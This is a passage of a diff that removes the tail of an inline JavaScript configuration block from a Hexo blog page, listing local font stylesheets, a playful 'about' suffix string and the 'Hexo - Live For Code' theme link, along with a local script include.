-            LongCang    : "/font/LongCang.css",
-            Monda       : "/font/Monda.css",
-            NotoSansSC  : "/font/NotoSansSC.css",
-            NotoSerifSC : "/font/NotoSerifSC.css",
-            Playball    : "/font/Playball.css",
-            PTMono      : "/font/PTMono.css",
-            Roboto      : "/font/Roboto.css",
-            RobotoSlab  : "/font/RobotoSlab.css",
-            Rosario     : "/font/Rosario.css",
-            UbuntuMono  : "/font/UbuntuMono.css"
-        },
-
-        Suffix : {
-            about : "原神,启动！"
-        },
-            
-        Theme : {
-            url  : "https://github.com/first19326/Hexo-LiveForCode",
-            name : "Hexo - Live For Code"
-        }  
-    };
-</script>
-    <script type="text/javascript" src="/js/index.js"></script>
 </body>
 </html>
